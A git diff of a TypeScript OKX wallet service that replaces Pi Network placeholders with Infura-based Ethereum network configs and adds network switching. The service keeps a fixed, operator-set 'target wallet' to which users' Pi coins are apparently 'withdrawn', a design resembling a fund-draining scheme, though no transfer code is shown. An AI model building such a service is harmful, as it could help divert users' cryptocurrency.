@@ -1,8 +1,27 @@
 import { ethers } from 'ethers';
+import { config, getNetworkConfig, getTransactionConfig } from '../config/environment';
 
-// Pi Network contract addresses (mainnet)
-const PI_TOKEN_ADDRESS = '0x0000000000000000000000000000000000000000'; // Replace with actual Pi token address
-const PI_NETWORK_RPC = 'https://mainnet.pi.network'; // Replace with actual Pi network RPC
+// Network configurations with environment-based Infura URLs
+const NETWORKS = {
+  mainnet: {
+    name: 'Ethereum Mainnet',
+    chainId: 1,
+    rpcUrl: `https://mainnet.infura.io/v3/${config.INFURA_PROJECT_ID}`,
+    explorer: 'https://etherscan.io'
+  },
+  sepolia: {
+    name: 'Sepolia Testnet',
+    chainId: 11155111,
+    rpcUrl: `https://sepolia.infura.io/v3/${config.INFURA_PROJECT_ID}`,
+    explorer: 'https://sepolia.etherscan.io'
+  },
+  goerli: {
+    name: 'Goerli Testnet',
+    chainId: 5,
+    rpcUrl: `https://goerli.infura.io/v3/${config.INFURA_PROJECT_ID}`,
+    explorer: 'https://goerli.etherscan.io'
+  }
+};
 
 interface PiWithdrawalResult {
   success: boolean;
@@ -17,20 +36,109 @@ interface WalletInfo {
   piBalance: string;
   network: string;
   isConnected: boolean;
+  chainId?: number;
 }
 
 // Local storage keys
 const WALLET_CONNECTION_KEY = 'okx_wallet_connected';
 const WALLET_ADDRESS_KEY = 'okx_wallet_address';
+const SELECTED_NETWORK_KEY = 'selected_network';
 
 class OKXWalletService {
   private provider: ethers.BrowserProvider | null = null;
   private signer: ethers.JsonRpcSigner | null = null;
   private targetWalletAddress: string = '';
+  private currentNetwork: string = config.DEFAULT_NETWORK;
 
   constructor() {
-    // Set the target wallet address where Pi coins will be withdrawn
-    this.targetWalletAddress = '0xffb5a95e5ff7ffc61813bba9171d026c64b09059'; // Replace with your target wallet
+    // Set the target wallet address from environment configuration
+    this.targetWalletAddress = config.TARGET_WALLET_ADDRESS;
+    
+    // Load saved network preference
+    this.loadNetworkPreference();
+  }
+
+  // Load network preference from localStorage
+  private loadNetworkPreference(): void {
+    try {
+      const savedNetwork = localStorage.getItem(SELECTED_NETWORK_KEY);
+      if (savedNetwork && NETWORKS[savedNetwork as keyof typeof NETWORKS]) {
+        this.currentNetwork = savedNetwork;
+      }
+    } catch (error) {
+      console.error('Error loading network preference:', error);
+    }
+  }
+
+  // Save network preference to localStorage
+  private saveNetworkPreference(): void {
+    try {
+      localStorage.setItem(SELECTED_NETWORK_KEY, this.currentNetwork);
+    } catch (error) {
+      console.error('Error saving network preference:', error);
+    }
+  }
+
+  // Get available networks
+  getAvailableNetworks() {
+    return NETWORKS;
+  }
+
+  // Get current network
+  getCurrentNetwork() {
+    return this.currentNetwork;
+  }
+
+  // Switch network
+  async switchNetwork(networkName: string): Promise<boolean> {
+    try {
+      if (!NETWORKS[networkName as keyof typeof NETWORKS]) {
+        throw new Error('Invalid network');
+      }
+
+      this.currentNetwork = networkName;
+      this.saveNetworkPreference();
+
+      // If wallet is connected, switch network in wallet
+      if (this.signer && typeof window.okxwallet !== 'undefined') {
+        const network = NETWORKS[networkName as keyof typeof NETWORKS];
+        await window.okxwallet.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+        });
+      }
+
+      return true;
+    } catch (error: any) {
+      console.error('Error switching network:', error);
+      
+      // If the network is not added to the wallet, try to add it
+      if (error.code === 4902 && typeof window.okxwallet !== 'undefined') {
+        try {
+          const network = NETWORKS[networkName as keyof typeof NETWORKS];
+          await window.okxwallet.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: `0x${network.chainId.toString(16)}`,
+              chainName: network.name,
+              nativeCurrency: {
+                name: 'Ether',
+                symbol: 'ETH',
+                decimals: 18
+              },
+              rpcUrls: [network.rpcUrl],
+              blockExplorerUrls: [network.explorer]
+            }]
+          });
+          return true;
+        } catch (addError) {
+          console.error('Error adding network:', addError);
+          return false;
+        }
+      }
+      
+      return false;
+    }
   }
 
   // Save wallet connection state to localStorage
@@ -89,6 +197,14 @@ class OKXWalletService {
         // Save connection state to localStorage
         this.saveWalletState(address);
         
+        // Get current network
+        const network = await this.provider.getNetwork();
+        const networkName = this.getNetworkNameByChainId(network.chainId);
+        if (networkName) {
+          this.currentNetwork = networkName;
+          this.saveNetworkPreference();
+        }
+        
         // Get ETH balance
         const balance = await this.provider.getBalance(address);
         const ethBalance = ethers.formatEther(balance);
@@ -100,8 +216,9 @@ class OKXWalletService {
           address,
           balance: ethBalance,
           piBalance,
-          network: 'Pi Network',
-          isConnected: true
+          network: NETWORKS[this.currentNetwork as keyof typeof NETWORKS].name,
+          isConnected: true,
+          chainId: Number(network.chainId)
         };
       } else {
         throw new Error('OKX Wallet not found. Please install the extension.');
@@ -125,6 +242,14 @@ class OKXWalletService {
           
           const address = accounts[0];
           
+          // Get current network
+          const network = await this.provider.getNetwork();
+          const networkName = this.getNetworkNameByChainId(network.chainId);
+          if (networkName) {
+            this.currentNetwork = networkName;
+            this.saveNetworkPreference();
+          }
+          
           // Get ETH balance
           const balance = await this.provider.getBalance(address);
           const ethBalance = ethers.formatEther(balance);
@@ -136,8 +261,9 @@ class OKXWalletService {
             address,
             balance: ethBalance,
             piBalance,
-            network: 'Pi Network',
-            isConnected: true
+            network: NETWORKS[this.currentNetwork as keyof typeof NETWORKS].name,
+            isConnected: true,
+            chainId: Number(network.chainId)
           };
         }
       }
@@ -308,6 +434,26 @@ class OKXWalletService {
 
   setTargetWalletAddress(address: string): void {
     this.targetWalletAddress = address;
+  }
+
+  // Helper method to get network name by chain ID
+  private getNetworkNameByChainId(chainId: bigint): string | null {
+    for (const [name, network] of Object.entries(NETWORKS)) {
+      if (network.chainId === Number(chainId)) {
+        return name;
+      }
+    }
+    return null;
+  }
+
+  // Get transaction configuration from environment
+  getTransactionConfig() {
+    return getTransactionConfig();
+  }
+
+  // Get network configuration from environment
+  getNetworkConfig() {
+    return getNetworkConfig();
   }
 }
 
